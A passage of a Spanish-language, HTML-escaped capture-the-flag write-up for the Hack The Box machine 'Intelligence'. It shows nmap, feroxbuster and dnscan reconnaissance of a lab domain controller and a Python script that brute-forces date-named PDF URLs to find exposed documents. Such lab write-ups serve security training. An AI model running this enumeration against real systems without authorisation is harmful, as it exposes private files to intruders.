&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed Jul  7 23:38:51 2021 as: nmap -Pn -sV -sC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49685,49686,49706,49712,53942 -oN scans 10.10.10.248&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.248 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.248&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.069s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2021-07-08 09:33:53Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: intelligence.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-07-08T09:35:40+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +5h55m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: intelligence.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-07-08T09:35:39+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +5h55m04s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: intelligence.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-07-08T09:35:40+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +5h55m05s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: intelligence.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-07-08T09:35:39+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +5h55m04s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
53942/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 5h55m03s, deviation: 2s, median: 5h55m03s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2021-07-08T09:34:55
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jul  7 23:40:35 2021 -- 1 IP address (1 host up) scanned in 104.26 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina estatica en el puerto 80, adem√°s muestra algunos PDFs que contienen texto &lt;a href=&#34;https://es.wikipedia.org/wiki/Lorem_ipsum&#34;&gt;Lorem Ipsum&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/intelligence/Screenshot_20210707_222845.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;Feroxbuster mostr√≥ unicamente la carpeta donde estan los PDFs.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 28m   220545/220545  127/s   http://intelligence.htb/&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 30m   220545/220545  120/s   http://intelligence.htb/documents&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 29m   220545/220545  124/s   http://intelligence.htb/Documents&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;subdominios&#34;&gt;Subdominios&lt;/h2&gt;
&lt;p&gt;Realizamos una enumeracion de subdominios utilizando &lt;a href=&#34;https://github.com/rbsec/dnscan&#34;&gt;dnscan&lt;/a&gt;. Encontramos algunos subdominios y direccion ipv6, los subdominios no muestra informacion por http.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ ~/tools/dnscan/dnscan.py -d intelligence.htb -w ~/tools/dnscan/all.txt -R 10.10.10.248 -n
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Processing domain intelligence.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using specified resolvers: 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting nameservers
10.10.10.248 - dc.intelligence.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Zone transfer failed

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IPv6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;AAAA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; records found. Try running dnscan with the -6 option.
dead:beef::3d59:f88a:8e8d:a571

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; DNSSEC not supported

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Scanning intelligence.htb &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; A records
10.10.10.248 - intelligence.htb
10.10.10.248 - dc.intelligence.htb
10.10.10.248 - domaindnszones.intelligence.htb
10.10.10.248 - forestdnszones.intelligence.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;documentos&#34;&gt;Documentos&lt;/h2&gt;
&lt;p&gt;Los PDFs que se muestran en la pagina estan dentro de &lt;code&gt;/documents/&lt;/code&gt; y cada uno de ellos tiene una fecha mas el valor &lt;strong&gt;&amp;lsquo;upload&amp;rsquo;&lt;/strong&gt;, creamos un peque√±o script en python para realizar una enumeracion de documentos existentes para buscar informacion sensible.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;zero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2015&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Init: {a}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;# Ex: http://intelligence.htb/documents/2020-12-30-upload.pdf&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://intelligence.htb/documents/{a}-{zero(b)}-{zero(c)}-upload.pdf&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;404&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Finish: {a}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutar el script encontramos una gran cantidad de documentos, abrimos cada uno de estos y solo en dos de ellos encontramos informacion relacionada a una  cuenta de usuario y actualizacion de parte de &lt;em&gt;&amp;lsquo;IT&amp;rsquo;&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/intelligence ‚ùØ ./enum_docs.py
Init: &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
http://intelligence.htb/documents/2020-06-04-upload.pdf &amp;lt;&amp;lt;-------
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
